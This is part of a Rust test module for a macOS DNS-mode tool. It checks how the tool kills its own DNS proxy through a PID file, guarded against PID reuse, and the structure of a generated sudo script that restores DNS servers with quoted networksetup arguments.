            .prefix("mhost-issue-163-pid-dead")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // 拿一个肯定不存在的 PID（PID 上限 ~4M，10M 必不存在）
        let dead_pid: u32 = 9_999_999;
        let pid_file = proxy_pid_file();
        std::fs::write(
            &pid_file,
            format!("{dead_pid} /nonexistent/mhost-dns-proxy\n"),
        )
        .unwrap();

        let outcome = kill_proxy_via_pid_file(&pid_file);
        assert_eq!(outcome, KillOutcome::PidDeadAlready);
        let _ = std::fs::remove_file(&pid_file);
    }

    /// PID 文件不存在：返回 FileMissing
    #[cfg(target_os = "macos")]
    #[test]
    fn test_kill_proxy_via_pid_file_missing() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::Builder::new()
            .prefix("mhost-issue-163-missing")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let pid_file = proxy_pid_file();
        assert!(!pid_file.exists(), "PID 文件必须不存在");

        let outcome = kill_proxy_via_pid_file(&pid_file);
        assert_eq!(outcome, KillOutcome::FileMissing);
    }

    /// PID 被其他进程重用：comm 不匹配 → #81 安全网生效，不杀
    #[cfg(target_os = "macos")]
    #[test]
    fn test_kill_proxy_via_pid_file_comm_mismatch_blocks_kill() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::Builder::new()
            .prefix("mhost-issue-163-mismatch")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // PR #164 review (blocker #2): install fake `ps` for sandboxed runners.
        let (_fake_bin_dir, _fake_bin_path) =
            setup_fake_bin_env_with_ps("#!/bin/sh\nexit 0\n", "#!/bin/sh\nexit 0\n", &[]);

        // 起一个不是 mhost-dns-proxy 的进程
        let mut other_child = std::process::Command::new("/bin/sh")
            .args(["-c", "exec sleep 30"])
            .spawn()
            .expect("spawn sleep");
        let other_pid = other_child.id();
        // spawn 走 `exec sleep 30` 后真实进程是 `/bin/sleep`（macOS
        // ps 对 sleep 返回 `/bin/sleep`）；fake `ps` 必须返回这个才能
        // 让 helper 的 comm 校验路径正常走到 basename 对比。
        append_ps_comm_map(other_pid, "/bin/sleep");

        // PID 文件写 other_pid，但 recorded_binary 是 mhost-dns-proxy
        // → expected_comm = "mhost-dns-proxy"
        // → ps 查 sleep 的 basename = "sleep"
        // → comm_basename != expected_comm → PidReusedOrMismatch
        let pid_file = proxy_pid_file();
        std::fs::write(
            &pid_file,
            format!("{other_pid} /usr/local/bin/mhost-dns-proxy\n"),
        )
        .unwrap();

        let outcome = kill_proxy_via_pid_file(&pid_file);

        // Assert 1: 不杀
        assert_eq!(
            outcome,
            KillOutcome::PidReusedOrMismatch,
            "comm 不匹配时必须返回 PidReusedOrMismatch 而不是 Killed"
        );

        // Assert 2: sleep 进程必须还活着
        let still_alive = unsafe { libc::kill(other_pid as libc::pid_t, 0) == 0 };
        assert!(
            still_alive,
            "PID 重用的 sleep ({other_pid}) 必须没被杀 —— #81 安全网生效"
        );

        // cleanup
        let _ = std::fs::remove_file(&pid_file);
        unsafe {
            libc::kill(other_pid as libc::pid_t, libc::SIGKILL);
        }
        let _ = other_child.wait();
    }

    /// 重复调用：第二次必须 no-op（不重复发信号给已死的进程）
    #[cfg(target_os = "macos")]
    #[test]
    fn test_kill_proxy_via_pid_file_idempotent() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::Builder::new()
            .prefix("mhost-issue-163-idempotent")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // PR #164 review (blocker #2): install fake `ps` for sandboxed runners.
        let (_fake_bin_dir, _fake_bin_path) =
            setup_fake_bin_env_with_ps("#!/bin/sh\nexit 0\n", "#!/bin/sh\nexit 0\n", &[]);
        let pid_marker = dir.path().join("fake_proxy.pid");

        let mut child = spawn_cooperative_fake_proxy(&pid_marker);
        let pid = wait_for_proxy_pid(&pid_marker);
        append_ps_comm_map(pid, "/bin/sh");

        // recorded_binary 用 `/bin/sh`（spawn 的实际解释器，ps 返回这个）
        let pid_file = proxy_pid_file();
        std::fs::write(&pid_file, format!("{pid} /bin/sh\n")).unwrap();

        // 第一次：杀
        let outcome1 = kill_proxy_via_pid_file(&pid_file);
        assert_eq!(outcome1, KillOutcome::Killed);
        // reap zombie 才能让 PID 释放
        let _ = child.wait();
        let still_alive = unsafe { libc::kill(pid as libc::pid_t, 0) == 0 };
        assert!(!still_alive);

        // 第二次：PID 文件还在但进程已死 → PidDeadAlready（无副作用）
        let outcome2 = kill_proxy_via_pid_file(&pid_file);
        assert_eq!(outcome2, KillOutcome::PidDeadAlready);

        let _ = std::fs::remove_file(&pid_file);
    }

    /// helper contract：Killed 路径下 PID 文件**不被**删除（caller 自己清）
    #[cfg(target_os = "macos")]
    #[test]
    fn test_kill_proxy_via_pid_file_does_not_remove_pid_file() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::Builder::new()
            .prefix("mhost-issue-163-no-rm")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // PR #164 review (blocker #2): install fake `ps` for sandboxed runners.
        let (_fake_bin_dir, _fake_bin_path) =
            setup_fake_bin_env_with_ps("#!/bin/sh\nexit 0\n", "#!/bin/sh\nexit 0\n", &[]);
        let pid_marker = dir.path().join("fake_proxy.pid");

        let mut child = spawn_cooperative_fake_proxy(&pid_marker);
        let pid = wait_for_proxy_pid(&pid_marker);
        append_ps_comm_map(pid, "/bin/sh");

        // recorded_binary 用 `/bin/sh`（spawn 的实际解释器，ps 返回这个）
        let pid_file = proxy_pid_file();
        std::fs::write(&pid_file, format!("{pid} /bin/sh\n")).unwrap();

        let outcome = kill_proxy_via_pid_file(&pid_file);
        assert_eq!(outcome, KillOutcome::Killed);
        // reap zombie 才能让 PID 真正释放（kill_proxy_via_pid_file 内部
        // 已用 waitpid(WNOHANG) 兜底，但这里再 wait() 一次保险；与
        // test_kill_proxy_via_pid_file_stuck_proxy_sigkill_escalates /
        // test_kill_proxy_via_pid_file_idempotent 的收尾模式一致）
        let _ = child.wait();

        // 关键：PID 文件必须还在（disable 路径 caller 统一清一组 temp 文件）
        assert!(
            pid_file.exists(),
            "helper contract：Killed 路径下 PID 文件不被 helper 删除"
        );
        let _ = std::fs::remove_file(&pid_file);
    }

    /// 防御性回归：issue #163 re-fix 把 kill 移进 `build_disable_script`
    /// 生成的 sudo 脚本。结构断言验证 `disable_dns_mode` 把 PID 透传给
    /// `osascript_restore` 的两个调用点（5s 超时 + proxy-not-running），
    /// 而不是把它们丢成 `None`（那会让 sudo 杀逻辑失效）。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_dns_mode_passes_pid_to_osascript_restore() {
        let source = include_str!("platform.rs");

        // 断言 0: build_disable_script 必须 pub(crate)（测试性）
        assert!(
            source.contains("pub(crate) fn build_disable_script"),
            "build_disable_script must be pub(crate) for testability"
        );

        let fn_start = source
            .find("pub fn disable_dns_mode")
            .expect("disable_dns_mode 必须存在");
        let fn_end_rel = source[fn_start..]
            .find("\npub fn ")
            .unwrap_or(source.len() - fn_start);
        let fn_body = &source[fn_start..fn_start + fn_end_rel];

        // 断言 1: proxy_pid 必须提到外层 scope
        assert!(
            fn_body.contains("let proxy_pid_at_start"),
            "issue #163 re-fix: proxy_pid must be lifted to outer scope via \
             'let proxy_pid_at_start' so both osascript_restore call sites see it"
        );

        // 断言 2: 5s 超时分支必须把 Some(proxy_pid) 传给 osascript_restore
        // （call site 是多行格式，只查"Some(proxy_pid)"子串即可定位）
        assert!(
            fn_body.contains("Some(proxy_pid)"),
            "issue #163 re-fix: 5s-timeout branch must pass Some(proxy_pid) to \
             osascript_restore so the sudo-escalated kill runs"
        );

        // 断言 3: proxy_pid_at_start 必须出现（外层 scope 变量名），说明
        // PID 被提到了 disable_dns_mode 函数顶部（而不是死在嵌套 block 里），
        // 且 proxy-not-running 分支的 osascript_restore 调用能拿到它
        assert!(
            fn_body.contains("proxy_pid_at_start"),
            "issue #163 re-fix: proxy_pid_at_start must be referenced (outer scope) \
             and passed through one of the osascript_restore call sites"
        );

        // 断言 4: PR #164 user-space kill 留作 defense-in-depth
        assert!(
            fn_body.contains("kill_proxy_via_pid_file(&proxy_pid_file())"),
            "issue #163 re-fix: user-space kill_proxy_via_pid_file block must \
             remain as defense-in-depth"
        );

        // 断言 5: 必须处理所有四个 KillOutcome 变体（不漏 match arm）
        for variant in [
            "Killed",
            "PidReusedOrMismatch",
            "PidDeadAlready",
            "FileMissing",
        ] {
            assert!(
                fn_body.contains(variant),
                "disable_dns_mode 必须 match KillOutcome::{variant}；漏 arm 会导致 \
                 重要事件没 log"
            );
        }
    }

    // -----------------------------------------------------------------------
    // build_disable_script 单元测试
    //
    // 直接消费生产 builder（不 format! 平行副本），保证 #156 review 的
    // 「修过的脚本结构真的触发」契约。
    // -----------------------------------------------------------------------

    /// None pid → 脚本里没有 kill 行
    #[test]
    fn test_build_disable_script_no_pid_no_kill_line() {
        let script = build_disable_script(&DisableScriptInputs {
            interface: "Wi-Fi",
            target: "Empty".to_string(),
            proxy_pid: None,
            expected_basename: None,
        });
        assert!(
            !script.contains("kill -9"),
            "None pid must NOT produce kill line; got: {script}"
        );
        // **fix (PR #164 review concern #3)**：target / interface 现在用
        // `shell_single_quote` 包裹。
        assert!(
            script.contains("networksetup -setdnsservers 'Wi-Fi' 'Empty'"),
            "None pid script must single-quote interface + target; got: {script}"
        );
        assert!(
            script.starts_with("networksetup"),
            "script must start with networksetup when no pid; got: {script}"
        );
    }

    /// Some(pid) + Some(basename) → #81 comm 校验 + kill + true 兜底
    #[test]
    fn test_build_disable_script_some_pid_with_comm_check() {
        let script = build_disable_script(&DisableScriptInputs {
            interface: "Wi-Fi",
            target: "8.8.8.8 1.1.1.1".to_string(),
            proxy_pid: Some(12345),
            expected_basename: Some("mhost-dns-proxy".to_string()),
        });
        // **fix (PR #164 review concern #3)**：EXPECTED 现在用 single-quote
        // 包裹（防御深度，即使 basename charset 校验已经过滤过）。
        assert!(
            script.contains("EXPECTED='mhost-dns-proxy'"),
            "must set EXPECTED env var single-quoted for comm check; got: {script}"
        );
        assert!(
            script.contains("ps -p '12345' -o comm="),
            "must use ps -p '<pid>' -o comm= (single-quoted per PR #164 review concern #3) for verification; got: {script}"
        );
        assert!(
            script
                .contains("if [ \"$ACTUAL\" = \"$EXPECTED\" ]; then kill -9 12345 2>/dev/null; fi"),
            "must wrap kill in if-guarded comm check; got: {script}"
        );
        // 尾部 `true` 让 ESRCH/EPERM/comm 不匹配都不让脚本非零退出
        assert!(
            script.contains("\ntrue\n"),
            "must include trailing 'true' to guarantee exit 0; got: {script}"
        );
        // 顺序：kill block 必须在 networksetup 之前（kill-then-restore 契约）
        let kill_pos = script.find("kill -9").expect("kill line");
        let ns_pos = script.find("networksetup").expect("networksetup");
        assert!(
            kill_pos < ns_pos,
            "kill block must precede networksetup; \
             kill_pos={kill_pos} ns_pos={ns_pos} script={script}"
        );
        // target 来自 OriginalDns::restore_argv()，会被 single-quote 整体
        // 包裹（含内嵌空格的 IP 列表不会触发 word splitting）。
        assert!(
            script.contains("networksetup -setdnsservers 'Wi-Fi' '8.8.8.8 1.1.1.1'"),
            "networksetup line must single-quote interface + target; got: {script}"
        );
    }

    /// Some(pid) + None(basename) → 跳过 comm 校验（老格式 PID 文件）
    #[test]
    fn test_build_disable_script_legacy_pid_file_no_comm_check() {
        let script = build_disable_script(&DisableScriptInputs {
            interface: "Wi-Fi",
            target: "Empty".to_string(),
            proxy_pid: Some(12345),
            expected_basename: None, // legacy PID file: only PID, no binary path
        });
        assert!(
            !script.contains("EXPECTED="),
            "legacy PID file must NOT produce EXPECTED env var; got: {script}"
        );
        // **fix (PR #164 review concern #4)**：legacy arm 现在在 stderr 打
        // 一条 WARNING 让 sudo 操作可见可审计（替代之前完全静默的 SIGKILL），
        // 然后才接 plain kill -9 兜底。
        assert!(
            script.contains(
                "echo \"WARNING: skipping #81 comm check for legacy PID file 12345\" >&2"
            ),
            "legacy arm must emit stderr WARNING before kill; got: {script}"
        );
        assert!(
            script.contains("kill -9 12345 2>/dev/null"),
            "legacy arm must still emit kill -9 for upgrade compatibility; got: {script}"
        );
        // WARNING 必须在 kill 之前（让操作员先看到警告再 kill）
        let warn_pos = script.find("WARNING:").expect("WARNING line missing");
        let kill_pos = script.find("kill -9 12345").expect("kill line");
        assert!(
            warn_pos < kill_pos,
            "WARNING must precede kill; warn_pos={warn_pos} kill_pos={kill_pos} \
             script={script}"
        );
        // networksetup 仍然在尾部，interface + target 都 single-quoted
        assert!(
            script.contains("networksetup -setdnsservers 'Wi-Fi' 'Empty'"),
            "legacy script must end with single-quoted networksetup; got: {script}"
        );
    }

    /// PID 必须 decimal 格式化（无 padding / 无 hex）
    #[test]
    fn test_build_disable_script_pid_format_is_decimal() {
        for pid in [0u32, 1, 99999, u32::MAX] {
            let script = build_disable_script(&DisableScriptInputs {
                interface: "Wi-Fi",
                target: "Empty".to_string(),
                proxy_pid: Some(pid),
                expected_basename: Some("mhost-dns-proxy".to_string()),
            });
            // **fix (PR #164 review concern #3)**：ps arg 现在用
            // `shell_single_quote` 包裹（PID 是 decimal，注入面理论为零；
            // 加 single-quote 是和 EXPECTED/target/iface 一致的防御深度）。
            assert!(
                script.contains(&format!("ps -p '{pid}' -o comm=")),
                "pid {pid} must format as decimal in single-quoted ps arg; got: {script}"
            );
            assert!(
                script.contains(&format!("kill -9 {pid} 2>/dev/null")),
                "pid {pid} must appear verbatim in kill line; got: {script}"
            );
        }
    }
}
